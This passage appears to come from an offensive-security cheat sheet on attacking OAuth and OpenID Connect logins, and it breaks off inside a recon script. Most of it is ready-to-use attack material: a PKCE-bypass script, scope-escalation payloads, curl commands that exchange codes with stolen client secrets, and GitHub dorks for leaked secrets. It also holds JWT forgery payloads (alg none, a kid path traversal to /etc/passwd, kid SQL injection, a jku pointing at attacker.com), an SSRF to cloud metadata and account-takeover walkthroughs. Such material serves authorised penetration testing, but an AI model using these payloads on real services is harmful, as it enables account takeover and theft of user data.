  def generate_pkce():
      """Generate PKCE code_verifier and code_challenge"""
      verifier = secrets.token_urlsafe(43)
      challenge = base64.urlsafe_b64encode(
          hashlib.sha256(verifier.encode()).digest()
      ).decode().rstrip('=')
      return verifier, challenge

  def test_no_pkce():
      """Test if PKCE can be omitted entirely"""
      print("[*] Test 1: Authorization without PKCE...")
      params = {
          "response_type": "code",
          "client_id": CLIENT_ID,
          "redirect_uri": REDIRECT_URI,
          "scope": "openid email",
          # No code_challenge or code_challenge_method
      }
      resp = requests.get(AUTH_URL, params=params, allow_redirects=False)
      if resp.status_code in [302, 200]:
          print("[!] PKCE not required - authorization proceeds without it")
          return True
      else:
          print("[+] PKCE appears to be required")
          return False

  def test_plain_method():
      """Test if plain challenge method is accepted"""
      print("[*] Test 2: PKCE with plain method...")
      verifier = secrets.token_urlsafe(43)
      params = {
          "response_type": "code",
          "client_id": CLIENT_ID,
          "redirect_uri": REDIRECT_URI,
          "scope": "openid email",
          "code_challenge": verifier,  # Plain = challenge equals verifier
          "code_challenge_method": "plain",
      }
      resp = requests.get(AUTH_URL, params=params, allow_redirects=False)
      if resp.status_code in [302, 200]:
          print("[!] Plain challenge method accepted - PKCE weakened")
          return True
      else:
          print("[+] Plain method rejected")
          return False

  def test_token_without_verifier(code):
      """Test if token exchange works without code_verifier"""
      print("[*] Test 3: Token exchange without code_verifier...")
      data = {
          "grant_type": "authorization_code",
          "code": code,
          "client_id": CLIENT_ID,
          "redirect_uri": REDIRECT_URI,
          # No code_verifier!
      }
      resp = requests.post(TOKEN_URL, data=data)
      if resp.status_code == 200 and "access_token" in resp.text:
          print("[!] Token issued WITHOUT code_verifier - PKCE bypass!")
          return True
      else:
          print("[+] code_verifier required for token exchange")
          return False

  test_no_pkce()
  test_plain_method()
  # test_token_without_verifier("AUTH_CODE_HERE")
  ```
  :::
::

---

## Scope Escalation

Request more permissions than the application is supposed to have.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Adding Extra Scopes"}
  ```txt [Payloads]
  # Original scope:
  scope=openid+email

  # Try adding more scopes:
  scope=openid+email+profile
  scope=openid+email+profile+admin
  scope=openid+email+repo                           # GitHub: access repos
  scope=openid+email+repo+delete_repo               # GitHub: delete repos
  scope=openid+email+user+gist+repo+admin:org       # GitHub: full access
  scope=openid+email+https://www.googleapis.com/auth/gmail.readonly  # Gmail
  scope=openid+email+https://www.googleapis.com/auth/drive           # Google Drive
  scope=openid+email+https://www.googleapis.com/auth/admin.directory.user.readonly  # Admin
  scope=openid+email+offline_access                 # Get refresh_token
  scope=openid+email+profile+phone+address          # All OIDC claims

  # Provider-specific high-privilege scopes:

  # Google:
  scope=https://www.googleapis.com/auth/gmail.modify
  scope=https://www.googleapis.com/auth/drive
  scope=https://www.googleapis.com/auth/cloud-platform
  scope=https://www.googleapis.com/auth/admin.directory.user

  # GitHub:
  scope=repo+admin:org+admin:repo_hook+delete_repo+user+gist

  # Microsoft:
  scope=openid+email+User.ReadWrite.All+Directory.ReadWrite.All+Mail.ReadWrite

  # Facebook:
  scope=email+public_profile+user_friends+manage_pages+publish_pages

  # Slack:
  scope=users:read+channels:read+chat:write+admin

  # Twitter/X:
  scope=tweet.read+tweet.write+users.read+dm.read+dm.write
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Scope Manipulation"}
  ```txt [Payloads]
  # Modifying scope parameter format

  # Space-separated (standard):
  scope=openid email profile admin

  # Plus-separated (URL encoded space):
  scope=openid+email+profile+admin

  # Comma-separated (some providers):
  scope=openid,email,profile,admin

  # URL-encoded:
  scope=openid%20email%20profile%20admin
  scope=openid%20email%20admin

  # Duplicate scopes:
  scope=email&scope=admin

  # Mixed separators:
  scope=openid+email,profile admin

  # Wildcard (some providers):
  scope=*
  scope=all
  scope=full_access
  scope=admin
  scope=root

  # Empty scope (inherit defaults):
  scope=
  # (remove scope parameter entirely)

  # Check if granted scopes differ from requested:
  # After getting token, inspect it:
  # JWT decode → check "scope" claim
  # Or: GET /userinfo or GET /api/me and check permissions
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Scope on Token Refresh"}
  ```txt [Attack Flow]
  # Scope escalation during token refresh

  STEP 1: Get initial token with limited scope:
          scope=openid+email

  STEP 2: Request token refresh with EXPANDED scope:
          POST /token
          grant_type=refresh_token&
          refresh_token=REFRESH_TOKEN&
          client_id=CLIENT_ID&
          client_secret=SECRET&
          scope=openid+email+admin+repo  # ← MORE SCOPES!

  STEP 3: If new token has expanded scopes → scope escalation
  
  # Also try during token exchange:
  POST /token
  grant_type=authorization_code&
  code=AUTH_CODE&
  scope=openid+email+admin  # Different from original request
  ```
  :::
::

---

## Client Secret Exposure

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Where Secrets Leak"}
  ```txt [Locations to Check]
  # Client secrets found in public/accessible locations

  1. MOBILE APP DECOMPILATION
     - Android APK: jadx, apktool
     - iOS IPA: class-dump, Hopper
     - React Native: bundle.js in assets
     - Flutter: libapp.so strings
     
     # Android:
     jadx -d output/ target.apk
     grep -r "client_secret" output/
     grep -r "client_id" output/
     grep -r "oauth" output/
     
     # iOS:
     strings TargetApp.ipa | grep -i "client_secret\|oauth\|api_key"

  2. JAVASCRIPT SOURCE
     # Browser dev tools → Sources tab
     # Search for: client_secret, clientSecret, oauth, api_key
     
     # Common locations:
     /static/js/main.*.js
     /static/js/app.*.js
     /bundle.js
     /config.js
     /env.js
     /.env
     /app.config.js
     
     # View source:
     curl -s https://target.com/ | grep -i "client_secret\|oauth\|api_key"
     curl -s https://target.com/static/js/main.js | grep -i "client_secret"

  3. PUBLIC REPOSITORIES
     # GitHub dorking:
     "target.com" client_secret
     "target.com" oauth_secret
     "target.com" GOOGLE_CLIENT_SECRET
     org:targetorg client_secret
     filename:.env client_secret
     filename:config client_secret oauth
     filename:docker-compose OAUTH
     filename:application.properties oauth
     filename:settings.py SECRET
     filename:appsettings.json ClientSecret

  4. CONFIGURATION FILES
     /.env
     /config.json
     /settings.json
     /application.yml
     /web.config
     /appsettings.json
     /wp-config.php
     /config/database.yml
     /.git/config

  5. ERROR MESSAGES
     # Trigger errors that dump configuration
     # Stack traces may include environment variables
     # Debug pages (Django debug, Flask debug, etc.)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Exploitation with Secret"}
  ```bash [Terminal]
  # Once you have client_id AND client_secret:

  # 1. Exchange any leaked authorization code:
  curl -X POST "https://auth.provider.com/token" \
    -d "grant_type=authorization_code" \
    -d "code=LEAKED_CODE" \
    -d "client_id=STOLEN_CLIENT_ID" \
    -d "client_secret=STOLEN_SECRET" \
    -d "redirect_uri=https://target.com/callback"

  # 2. Use client credentials flow (no user needed):
  curl -X POST "https://auth.provider.com/token" \
    -d "grant_type=client_credentials" \
    -d "client_id=STOLEN_CLIENT_ID" \
    -d "client_secret=STOLEN_SECRET" \
    -d "scope=admin"

  # 3. Refresh any leaked refresh token:
  curl -X POST "https://auth.provider.com/token" \
    -d "grant_type=refresh_token" \
    -d "refresh_token=LEAKED_REFRESH_TOKEN" \
    -d "client_id=STOLEN_CLIENT_ID" \
    -d "client_secret=STOLEN_SECRET"

  # 4. Impersonate the application:
  # Create fake login page that uses the real client_id/secret
  # Users think they're logging into the real app
  # Attacker captures all authorization codes
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Automated Secret Scanning"}
  ```bash [Terminal]
  # trufflehog - scan repos for secrets
  trufflehog github --org=targetorg --only-verified
  trufflehog git https://github.com/target/repo.git

  # gitleaks
  gitleaks detect --source=/path/to/repo --verbose
  gitleaks detect --source=https://github.com/target/repo

  # nuclei secret detection
  echo "https://target.com" | nuclei -t ~/nuclei-templates/http/exposures/

  # Manual JavaScript scanning
  # Download all JS files from target:
  echo "https://target.com" | gau | grep "\.js$" | sort -u > js_files.txt
  
  while read url; do
    curl -s "$url" | grep -iE \
      "(client_secret|clientSecret|oauth_secret|api_secret|app_secret|GOOGLE_SECRET|FACEBOOK_SECRET|GITHUB_SECRET)" \
      && echo "  ↑ Found in: $url"
  done < js_files.txt

  # LinkFinder - find endpoints in JS
  python3 linkfinder.py -i https://target.com/static/js/main.js -o cli | \
    grep -i "oauth\|token\|auth\|client"
  ```
  :::
::

---

## Account Takeover Techniques

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Email-Based ATO"}
  ```txt [Attack Flow]
  # OAuth provider returns email, app uses it for account lookup
  # If email is not verified or verification is skippable → ATO

  SCENARIO 1: Unverified Email from OAuth Provider
  ─────────────────────────────────────────────────
  1. Victim has account: victim@example.com
  2. Attacker registers on OAuth provider with victim@example.com
     (some providers don't verify email immediately)
  3. Attacker uses "Login with Provider" on target app
  4. Provider returns email: victim@example.com (unverified!)
  5. Target app matches email → logs attacker in as victim

  SCENARIO 2: Email Change on Provider
  ─────────────────────────────────────
  1. Attacker creates OAuth account with attacker@evil.com
  2. Attacker links OAuth to target app (creates target account)
  3. Attacker changes OAuth email to victim@example.com
  4. Attacker re-authenticates via OAuth
  5. Target app updates email → now has victim's email
  6. OR target app finds existing victim account → merges/takes over

  SCENARIO 3: Case-Sensitivity Mismatch
  ──────────────────────────────────────
  1. Victim has account: Victim@Example.com
  2. Attacker registers OAuth with: victim@example.com (lowercase)
  3. Provider returns: victim@example.com
  4. Target app compares case-insensitively → matches victim
  5. Attacker logged in as victim

  SCENARIO 4: Email Provider Variants
  ────────────────────────────────────
  1. Victim: victim@gmail.com
  2. Attacker creates Google account: victim@googlemail.com
     (Gmail aliases: gmail.com = googlemail.com)
  3. Attacker OAuth login → email returned: victim@googlemail.com
  4. If app normalizes → matches victim@gmail.com → ATO
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Pre-Account Takeover"}
  ```txt [Attack Flow]
  # Attacker creates account BEFORE victim registers
  # When victim later uses OAuth, their account is hijacked

  STEP 1: Attacker discovers victim's email: victim@example.com

  STEP 2: Attacker creates account on target app:
          - Register with victim@example.com
          - Use password: attacker_password
          - Email verification may not be required
          - OR attacker verifies if they have temporary email access

  STEP 3: Victim later signs up using "Login with Google"
          - Google returns email: victim@example.com
          - Target app finds EXISTING account with this email
          - Automatically LINKS Google OAuth to existing account
          - Victim can now login via Google

  STEP 4: Attacker ALSO still has access:
          - Login with victim@example.com + attacker_password
          - Password login still works!
          - Attacker has persistent access to victim's account

  IMPACT: Both attacker (via password) and victim (via OAuth)
          can access the same account.
          Attacker reads all victim's data.
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Provider Confusion"}
  ```txt [Attack Flow]
  # Different OAuth providers return different identifiers
  # If app incorrectly maps identifiers → ATO

  SCENARIO: Sub/ID Collision
  ──────────────────────────
  1. Victim links Google account (sub=12345)
  2. Attacker creates Facebook account with ID 12345
     (Facebook and Google use different ID spaces)
  3. App stores: user_id=12345, provider=google
  4. Attacker logs in via Facebook with ID 12345
  5. App looks up: user_id=12345 (doesn't check provider!)
  6. Attacker logged in as victim

  CHECK:
  - Does the app store provider + sub_id together?
  - Or just the sub_id/email alone?
  - Can different providers map to the same account?

  SCENARIO: Missing Provider Binding
  ───────────────────────────────────
  POST /api/oauth/callback
  {
    "provider": "google",
    "id": "12345",
    "email": "victim@example.com"
  }

  # Change provider:
  POST /api/oauth/callback
  {
    "provider": "facebook",    ← CHANGED
    "id": "12345",
    "email": "attacker@evil.com"  ← CHANGED
  }

  # If app doesn't verify the provider claim → ATO
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Token Substitution"}
  ```txt [Attack Flow]
  # Application receives token and trusts its contents
  # Without verifying it came from the expected provider

  STEP 1: App sends user to Google for OAuth
  STEP 2: User authenticates → Google returns access_token
  STEP 3: App uses access_token to call Google's /userinfo
  STEP 4: Google returns: {"email": "user@gmail.com", "sub": "123"}
  STEP 5: App creates session for user@gmail.com

  ATTACK:
  STEP 1: Attacker intercepts the token exchange
  STEP 2: Replaces Google access_token with attacker's OWN token
          (from attacker's Google account)
  STEP 3: App calls Google /userinfo with ATTACKER's token
  STEP 4: Google returns ATTACKER's info: {"email":"attacker@gmail.com"}
  STEP 5: App creates session for attacker (not victim)

  BUT - If app doesn't verify token audience (aud claim):
  STEP 1: Attacker gets a valid Google token from a DIFFERENT app
  STEP 2: Token has victim's email but was issued for different client
  STEP 3: App accepts token without checking client_id / aud
  STEP 4: Attacker logs in as victim

  # Check: Does app verify the token's "aud" (audience) claim?
  # Check: Does app verify the token was issued for THIS specific client_id?
  ```
  :::
::

---

## OpenID Connect (OIDC) Flaws

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="ID Token Manipulation"}
  ```txt [Payloads]
  # OIDC returns an id_token (JWT) with user claims
  # If not properly validated → manipulation possible

  # Decode id_token:
  # Header: {"alg":"RS256","typ":"JWT","kid":"key-id"}
  # Payload: {"sub":"123","email":"user@gmail.com","aud":"client_id","iss":"https://accounts.google.com","exp":1625000000}

  # Attack 1: Algorithm confusion (alg: none)
  # Change algorithm to "none" and remove signature:
  {"alg":"none","typ":"JWT"}
  {"sub":"victim_id","email":"victim@gmail.com","aud":"client_id"}
  .
  # Base64 encode header + payload, empty signature

  # Attack 2: Algorithm switch (RS256 → HS256)
  # Server's RSA public key used as HMAC secret
  {"alg":"HS256","typ":"JWT"}
  # Sign with server's public key as HMAC key

  # Attack 3: Modify claims without re-signing
  # Some apps don't verify JWT signature!
  # Change "sub" or "email" to victim's values

  # Attack 4: kid injection
  {"alg":"RS256","kid":"../../etc/passwd"}
  {"alg":"HS256","kid":"null_key"}

  # Attack 5: Expired token acceptance
  # Use token with past "exp" claim
  # If server doesn't check expiration → valid forever

  # Attack 6: Wrong issuer acceptance
  # Use id_token from different provider
  # Change "iss" to expected value
  # If signature not verified → accepted
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Nonce Bypass"}
  ```txt [Payloads]
  # OIDC nonce prevents token replay attacks
  # Similar to state parameter but for id_tokens

  # Missing nonce:
  # Remove nonce from authorization request
  # Check if id_token is issued without nonce claim
  # If yes → token replay possible

  # Nonce not validated:
  # Get id_token with nonce=AAA
  # Use it with session expecting nonce=BBB
  # If accepted → nonce not validated

  # Predictable nonce:
  nonce=1
  nonce=123
  nonce=test
  nonce=nonce
  nonce=0

  # Empty nonce:
  nonce=
  nonce=%00
  nonce=null

  # Nonce reuse:
  # Use same nonce across different sessions
  # If accepted → nonce not bound to session
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Userinfo Endpoint Abuse"}
  ```txt [Attack Flow]
  # Some apps trust the /userinfo response without verifying
  # the access_token was issued for THEIR application

  # Standard flow:
  # App gets access_token → calls GET /userinfo → trusts response

  # Attack: Token from different application
  STEP 1: Register your own OAuth app with same provider
  STEP 2: Get access_token for victim's account on YOUR app
  STEP 3: Send this token to target app's callback
  STEP 4: Target app calls /userinfo with YOUR token
  STEP 5: Provider returns victim's info (valid token)
  STEP 6: Target app trusts it → logs attacker in as victim

  # The vulnerability: target app doesn't verify
  # that the token was issued for THEIR client_id

  # Check /userinfo response:
  GET https://auth.provider.com/userinfo
  Authorization: Bearer ACCESS_TOKEN

  # Response should be validated against:
  # - Token audience (aud) matches client_id
  # - Token was issued by expected provider
  # - Token is not expired
  ```
  :::
::

---

## OAuth Flow-Specific Attacks

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="response_type Manipulation"}
  ```txt [Payloads]
  # Change response_type to use a more vulnerable flow

  # Original (Authorization Code - more secure):
  response_type=code

  # Switch to Implicit (token in URL - less secure):
  response_type=token
  response_type=id_token
  response_type=id_token+token

  # Hybrid flows:
  response_type=code+token
  response_type=code+id_token
  response_type=code+id_token+token

  # Why this matters:
  # - "token" → access_token in URL fragment (leaks easily)
  # - "id_token" → JWT in URL fragment (contains user info)
  # - Server may support flows it shouldn't
  # - Implicit flow has no PKCE protection
  # - Token in URL = Referer leaks, history, logs

  # Test: Change response_type and see if server accepts it
  # Even if the APPLICATION uses authorization code flow
  # the AUTHORIZATION SERVER might accept implicit flow
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="grant_type Manipulation"}
  ```txt [Payloads]
  # Try different grant types on the token endpoint

  # Standard:
  grant_type=authorization_code

  # Try:
  grant_type=client_credentials    # No user needed!
  grant_type=password              # Direct username/password
  grant_type=implicit
  grant_type=refresh_token
  grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer
  grant_type=urn:ietf:params:oauth:grant-type:device_code
  grant_type=urn:ietf:params:oauth:grant-type:saml2-bearer

  # Password grant (if supported):
  POST /token
  grant_type=password&
  username=victim@example.com&
  password=password123&
  client_id=CLIENT_ID&
  client_secret=SECRET

  # → Direct login without OAuth flow!
  # → Brute force password via token endpoint!
  # → May not have same rate limiting as login page!

  # Device code grant:
  POST /device/code
  client_id=CLIENT_ID&
  scope=openid+email

  # → Returns device_code + user_code
  # → Social engineering: Ask victim to enter user_code
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Token Endpoint Abuse"}
  ```txt [Payloads]
  # Misconfigured token endpoint attacks

  # 1. No client authentication required:
  POST /token
  grant_type=authorization_code&
  code=AUTH_CODE&
  redirect_uri=CALLBACK
  # No client_id or client_secret!

  # 2. Client ID without secret:
  POST /token
  grant_type=authorization_code&
  code=AUTH_CODE&
  client_id=CLIENT_ID&
  redirect_uri=CALLBACK
  # No client_secret!

  # 3. Wrong client_secret accepted:
  POST /token
  grant_type=authorization_code&
  code=AUTH_CODE&
  client_id=CLIENT_ID&
  client_secret=wrong_secret&
  redirect_uri=CALLBACK

  # 4. Client credentials in URL (should be in body):
  POST /token?client_id=ID&client_secret=SECRET
  grant_type=authorization_code&code=AUTH_CODE

  # 5. Token endpoint accessible without authentication:
  POST /token
  grant_type=client_credentials
  # → Issues machine token without any credentials?

  # 6. CORS on token endpoint:
  # If /token has permissive CORS:
  # JavaScript from any origin can exchange codes for tokens
  ```
  :::
::

---

## Miscellaneous OAuth Attacks

### Registration & Configuration

```txt [Payloads]
# Dynamic Client Registration (RFC 7591)
# If authorization server supports dynamic registration:

POST /register HTTP/1.1
Content-Type: application/json

{
  "client_name": "Attacker App",
  "redirect_uris": ["https://attacker.com/callback"],
  "grant_types": ["authorization_code", "client_credentials"],
  "response_types": ["code", "token"],
  "scope": "openid email profile admin",
  "token_endpoint_auth_method": "none"
}

# If registration is open:
# → Attacker creates their own OAuth client
# → With attacker-controlled redirect_uri
# → With expanded scopes
# → Can be used to phish users

# Check for open registration endpoints:
POST /api/oauth/register
POST /oauth/register
POST /connect/register
POST /.well-known/openid-configuration → check "registration_endpoint"

# SSRF via redirect_uri in registration:
{
  "redirect_uris": ["http://169.254.169.254/latest/meta-data/"]
}
# → Authorization server may validate by making HTTP request
# → SSRF to cloud metadata endpoint
```

### Well-Known Configuration

```bash [Terminal]
# Discover OAuth/OIDC configuration:

# OpenID Connect discovery:
curl -s "https://auth.provider.com/.well-known/openid-configuration" | jq .

# OAuth 2.0 authorization server metadata:
curl -s "https://auth.provider.com/.well-known/oauth-authorization-server" | jq .

# Key information to extract:
# - authorization_endpoint
# - token_endpoint
# - userinfo_endpoint
# - jwks_uri (public keys for JWT verification)
# - registration_endpoint (dynamic client registration)
# - scopes_supported
# - response_types_supported
# - grant_types_supported
# - token_endpoint_auth_methods_supported
# - code_challenge_methods_supported (PKCE support)

# Download JWK keys:
curl -s "https://auth.provider.com/.well-known/jwks.json" | jq .

# Check for debug endpoints:
curl -s "https://auth.provider.com/.well-known/openid-configuration" | \
  jq -r '.introspection_endpoint, .revocation_endpoint, .device_authorization_endpoint'
```

### JWT Token Attacks

::code-collapse
```txt [JWT Attack Payloads]
# If OAuth tokens are JWTs, apply JWT-specific attacks:

# 1. Algorithm None:
# Original: {"alg":"RS256"} → Change to: {"alg":"none"}
# Remove signature entirely
# Tool: jwt_tool.py -M at -t TOKEN

# 2. HMAC/RSA Confusion (CVE-2016-5431):
# Change RS256 to HS256
# Sign with server's RSA public key as HMAC secret
# python3 jwt_tool.py -X k -pk public_key.pem TOKEN

# 3. JWK Header Injection:
# Embed attacker's public key in JWT header:
{"alg":"RS256","jwk":{"kty":"RSA","n":"...attacker_key...","e":"AQAB"}}
# Sign with attacker's private key
# Server uses embedded JWK to verify → attacker controls key

# 4. JKU/X5U Header Injection:
{"alg":"RS256","jku":"https://attacker.com/.well-known/jwks.json"}
# Server fetches attacker's key set
# Attacker signs token with own key

# 5. Kid Injection:
{"alg":"HS256","kid":"../../etc/passwd"}
# Server reads /etc/passwd content as HMAC key
# Attacker signs with known content

{"alg":"HS256","kid":"key_id' UNION SELECT 'AAA' -- "}
# SQL injection in kid parameter
# Attacker controls the signing key value

# 6. Claim Modification:
# Decode → change "sub", "email", "role", "admin"
# Re-encode → if signature not verified, it works

# 7. Token Expiration Bypass:
# Change "exp" to far future: "exp": 9999999999
# If server doesn't validate exp → token valid forever

# Tools:
# jwt_tool: python3 jwt_tool.py TOKEN -T
# jwt.io: https://jwt.io/ (decode and inspect)
# jwt-cracker: for brute-forcing weak HMAC secrets
```
::

---

## Testing Methodology

::steps{level="3"}

### Map the OAuth Flow

```bash [Terminal]
# Intercept the complete OAuth flow with Burp Suite

# 1. Click "Login with Google/GitHub/Facebook"
# 2. Capture every request/response in Burp
# 3. Document:
#    - Authorization URL and parameters
#    - Redirect URI configured
#    - Scopes requested
#    - State parameter (present? random?)
#    - Response type (code? token?)
#    - Callback handling (how code is exchanged)
#    - Token storage (cookie? localStorage? sessionStorage?)
#    - PKCE usage (code_challenge present?)

# Extract OAuth parameters from page source:
curl -s "https://target.com/login" | grep -iE \
  "(client_id|redirect_uri|response_type|scope|state|authorize|oauth|openid)"

# Check .well-known:
curl -s "https://target.com/.well-known/openid-configuration" | jq .
```

### Test Redirect URI

```txt [Test Matrix]
For each redirect_uri bypass technique:
1. Modify redirect_uri in authorization request
2. Check if authorization server accepts it
3. If accepted, verify code/token is sent to modified URI
4. Attempt to exchange code for token

Priority order:
- Open redirect on target domain (most likely to work)
- Path traversal (../redirect?url=)
- Subdomain variations (*.target.com)
- Domain confusion (@, null byte, etc.)
- Protocol downgrade (https → http)
```

### Test State Parameter

```txt [Test Matrix]
1. Remove state parameter entirely → flow still works?
2. Use empty state → accepted?
3. Use wrong state value → accepted?
4. Use state from different session → accepted?
5. Check if state is cryptographically random
6. Check if state is bound to session
7. Attempt CSRF account linking attack
```

### Test Token Handling

```txt [Test Matrix]
1. Can authorization code be reused?
2. Does code expire quickly (< 10 minutes)?
3. Is code bound to client_id?
4. Is code bound to redirect_uri?
5. Does Referer leak code to external resources?
6. Can response_type be changed to "token"?
7. Is PKCE enforced?
8. Can PKCE be downgraded to "plain"?
9. Are tokens in API responses?
10. Is token audience (aud) verified?
```

### Test Scope & Permissions

```txt [Test Matrix]
1. Add extra scopes to authorization request
2. Request admin/privileged scopes
3. Scope escalation on token refresh
4. Scope escalation on code exchange
5. Check granted vs requested scopes
6. Test with wildcard scope (*)
```

### Chain for Account Takeover

```txt [Test Matrix]
1. Redirect URI bypass → steal code → exchange → ATO
2. Missing state → CSRF account linking → ATO
3. Unverified email → register with victim email → ATO
4. Pre-account takeover (register before victim)
5. Provider confusion (wrong provider mapping)
6. Client secret exposure → impersonate app
```

::

---

## Testing Checklist

::collapsible

```txt [OAuth Misconfiguration Testing Checklist]
═══════════════════════════════════════════════════════
  OAUTH MISCONFIGURATION TESTING CHECKLIST
═══════════════════════════════════════════════════════

[ ] RECONNAISSANCE
    [ ] Map complete OAuth flow (every request/response)
    [ ] Identify OAuth provider (Google, GitHub, Facebook, custom)
    [ ] Extract client_id
    [ ] Identify redirect_uri
    [ ] Identify scopes requested
    [ ] Check response_type (code vs token vs id_token)
    [ ] Check for PKCE (code_challenge parameter)
    [ ] Check .well-known/openid-configuration
    [ ] Identify token endpoint
    [ ] Check for dynamic client registration

[ ] REDIRECT URI BYPASS
    [ ] Path traversal (../redirect?url=)
    [ ] Path addition (/callback/extra, /callbackXXX)
    [ ] Subdomain variation (evil.target.com)
    [ ] Domain confusion (target.com@attacker.com)
    [ ] Null byte (attacker.com%00.target.com)
    [ ] Protocol downgrade (https → http)
    [ ] Port variation (:8080, :443)
    [ ] Case variation (TARGET.COM)
    [ ] Trailing slash/dot (/callback/, /callback/.)
    [ ] URL encoding (%2f, %252f)
    [ ] Fragment injection (#@attacker.com)
    [ ] Parameter injection (/callback?redirect=evil.com)
    [ ] Multiple redirect_uri parameters
    [ ] Localhost/127.0.0.1
    [ ] Custom URI schemes
    [ ] Open redirect chain on target domain
    [ ] Subdomain takeover + wildcard redirect

[ ] STATE PARAMETER
    [ ] Missing state parameter
    [ ] Empty state parameter
    [ ] Wrong/random state accepted
    [ ] Static/predictable state
    [ ] State not bound to session
    [ ] CSRF account linking attack
    [ ] State fixation

[ ] AUTHORIZATION CODE
    [ ] Code reuse (multiple exchanges)
    [ ] Code expiration (> 10 minutes?)
    [ ] Code not bound to client_id
    [ ] Code not bound to redirect_uri
    [ ] Code in Referer header leak
    [ ] Code in server logs
    [ ] Code in browser history

[ ] PKCE
    [ ] PKCE not required (remove code_challenge)
    [ ] Plain method accepted (code_challenge_method=plain)
    [ ] Token exchange without code_verifier
    [ ] Weak code_verifier generation

[ ] TOKEN HANDLING
    [ ] Token in URL (implicit flow)
    [ ] Token in Referer header
    [ ] Token in API responses
    [ ] Token in JavaScript variables
    [ ] Token in HTML source
    [ ] Token audience (aud) not verified
    [ ] Token issuer (iss) not verified
    [ ] Token expiration not checked
    [ ] Refresh token scope escalation
    [ ] JWT algorithm confusion

[ ] SCOPE ESCALATION
    [ ] Add extra scopes to request
    [ ] Admin/privileged scopes
    [ ] Wildcard scope (*)
    [ ] Scope on token refresh
    [ ] Scope on code exchange
    [ ] Check granted vs requested

[ ] RESPONSE TYPE MANIPULATION
    [ ] Change code → token
    [ ] Change code → id_token
    [ ] Hybrid flows (code+token)
    [ ] response_mode manipulation

[ ] GRANT TYPE ABUSE
    [ ] client_credentials grant (no user)
    [ ] password grant (direct login)
    [ ] device_code grant
    [ ] Token endpoint without authentication

[ ] CLIENT SECRET
    [ ] Exposed in JavaScript source
    [ ] Exposed in mobile app (decompile)
    [ ] Exposed in public repositories
    [ ] Exposed in configuration files
    [ ] Exposed in error messages
    [ ] Client authentication not required

[ ] ACCOUNT TAKEOVER
    [ ] Unverified email from provider
    [ ] Pre-account takeover
    [ ] Provider confusion (wrong provider mapping)
    [ ] Email case sensitivity mismatch
    [ ] Token substitution (wrong audience)
    [ ] CSRF account linking

[ ] OIDC-SPECIFIC
    [ ] id_token signature not verified
    [ ] Algorithm none/confusion attack
    [ ] JWK/JKU header injection
    [ ] kid parameter injection
    [ ] Nonce not validated
    [ ] Nonce missing
    [ ] Claims modification
    [ ] Userinfo endpoint token audience

═══════════════════════════════════════════════════════
```

::

---

## Automation Scripts

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="OAuth Recon"}
  ::code-collapse
  ```python [oauth_recon.py]
  #!/usr/bin/env python3
  """
  OAuth Misconfiguration Scanner
  Discovers OAuth configuration and tests common flaws
  """
  import requests
  import json
  import sys
  import re
  from urllib.parse import urlparse, parse_qs, urlencode

  class OAuthRecon:
      def __init__(self, target):
          self.target = target
          self.session = requests.Session()
          self.session.headers["User-Agent"] = "Mozilla/5.0"
          self.findings = []
      
      def discover_oauth_config(self):
          """Find OAuth endpoints and configuration"""
          print(f"\n[*] Discovering OAuth configuration for {self.target}")
          
          # Check well-known endpoints
          well_known = [
              "/.well-known/openid-configuration",
              "/.well-known/oauth-authorization-server",
              "/oauth/.well-known/openid-configuration",
              "/.well-known/openid-configuration/",
          ]
          
          for path in well_known:
              try:
                  resp = self.session.get(f"{self.target}{path}", timeout=10)
                  if resp.status_code == 200:
                      config = resp.json()
                      print(f"[+] Found OIDC config at {path}")
                      print(f"    Authorization: {config.get('authorization_endpoint', 'N/A')}")
                      print(f"    Token: {config.get('token_endpoint', 'N/A')}")
                      print(f"    Userinfo: {config.get('userinfo_endpoint', 'N/A')}")
                      print(f"    JWKS: {config.get('jwks_uri', 'N/A')}")
                      print(f"    Registration: {config.get('registration_endpoint', 'N/A')}")
                      print(f"    Scopes: {config.get('scopes_supported', 'N/A')}")
                      print(f"    Response Types: {config.get('response_types_supported', 'N/A')}")
                      print(f"    Grant Types: {config.get('grant_types_supported', 'N/A')}")
                      print(f"    PKCE: {config.get('code_challenge_methods_supported', 'N/A')}")
                      
                      if config.get('registration_endpoint'):
                          self.findings.append("Dynamic client registration endpoint found!")
                      return config
              except:
                  pass
          
          print("[-] No well-known config found")
          return None
      
      def extract_oauth_params(self):
          """Extract OAuth parameters from login page"""
          print(f"\n[*] Extracting OAuth parameters from login page...")
          
          try:
              resp = self.session.get(f"{self.target}/login", timeout=10, allow_redirects=False)
              body = resp.text
              
              # Find OAuth URLs
              oauth_patterns = [
                  r'(https?://[^\s"\']+/authorize\?[^\s"\']+)',
                  r'(https?://[^\s"\']+/oauth[^\s"\']+)',
                  r'client_id[=:]\s*["\']?([a-zA-Z0-9._-]+)',
                  r'redirect_uri[=:]\s*["\']?(https?://[^\s"\'&]+)',
                  r'scope[=:]\s*["\']?([^\s"\'&]+)',
              ]
              
              for pattern in oauth_patterns:
                  matches = re.findall(pattern, body)
                  for match in matches:
                      print(f"    Found: {match[:100]}")
              
              # Check redirect for OAuth
              if resp.status_code in [301, 302, 303]:
                  location = resp.headers.get("Location", "")
                  if "authorize" in location or "oauth" in location:
                      print(f"[+] OAuth redirect: {location[:150]}")
                      parsed = urlparse(location)
                      params = parse_qs(parsed.query)
                      for key, val in params.items():
                          print(f"    {key}: {val[0][:80]}")
          except Exception as e:
              print(f"[-] Error: {e}")
      
      def check_client_secrets(self):
          """Check for exposed client secrets in JavaScript"""
          print(f"\n[*] Checking for client secret exposure...")
          
